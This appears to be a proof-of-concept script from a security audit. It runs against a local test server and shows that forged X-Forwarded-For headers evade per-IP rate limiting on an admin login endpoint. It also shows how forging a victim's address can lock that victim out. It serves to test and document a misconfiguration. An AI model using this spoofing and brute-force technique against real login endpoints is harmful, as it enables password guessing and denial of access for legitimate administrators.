"""PoC: rate-limit IP key comes from X-Forwarded-For when uvicorn trusts the proxy ("--forwarded-allow-ips=*").

nginx (infrastructure/nginx/snippets/proxy-backend.conf) OVERWRITES X-Forwarded-For with $remote_addr, so through nginx
the header cannot be forged. This script shows what happens when the backend port is reachable without nginx in front
(someone publishes 8000, a second proxy that appends instead of overwriting, a mis-set nginx include):
  1. 40 failed admin logins from one real address with a fresh forged address each time -> never limited;
  2. the same 40 without forging -> limited after 10;
  3. forging the address of a victim (e.g. the campus NAT) -> the victim is locked out of /admin-login.
Run from the repo root:  python docs/audit/poc/s4/poc_xff_spoof.py
"""
import os
import subprocess
import sys
import tempfile
import time

import httpx

HERE = os.path.dirname(os.path.abspath(__file__))
PORT = 8791
WORK = tempfile.mkdtemp(prefix="s4-xff-")
proc = subprocess.Popen([sys.executable, os.path.join(HERE, "run_local_server.py"), str(PORT), "*", WORK],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
BASE = f"http://127.0.0.1:{PORT}/api/v1"
H = {"X-Requested-With": "XMLHttpRequest"}
try:
    for _ in range(60):
        try:
            if httpx.get(f"{BASE}/health", timeout=1).status_code == 200:
                break
        except httpx.HTTPError:
            time.sleep(0.5)

    def attempt(user, ip=None):
        headers = dict(H)
        if ip:
            headers["X-Forwarded-For"] = ip
        return httpx.post(f"{BASE}/auth/admin-login", json={"username": user, "password": "wrong"}, headers=headers, timeout=10).status_code

    forged = [attempt(f"u{i}", f"203.0.113.{i + 1}") for i in range(40)]
    print("1. forged XFF, 40 failures :", sorted(set(forged)), "-> 429 count:", forged.count(429))
    plain = [attempt(f"v{i}") for i in range(40)]
    print("2. no XFF,     40 failures :", sorted(set(plain)), "-> first 429 at attempt #", plain.index(429) + 1 if 429 in plain else None)
    # a victim address gets exhausted by someone else
    victim = "198.51.100.7"
    for i in range(10):
        attempt(f"w{i}", victim)
    r = httpx.post(f"{BASE}/auth/admin-login", json={"username": "portal_admin", "password": "Adm1n-Test-Password!"},
                   headers={**H, "X-Forwarded-For": victim}, timeout=10)
    print("3. real admin password from the victim address after 10 forged failures ->", r.status_code, r.json().get("detail"))
finally:
    proc.terminate()
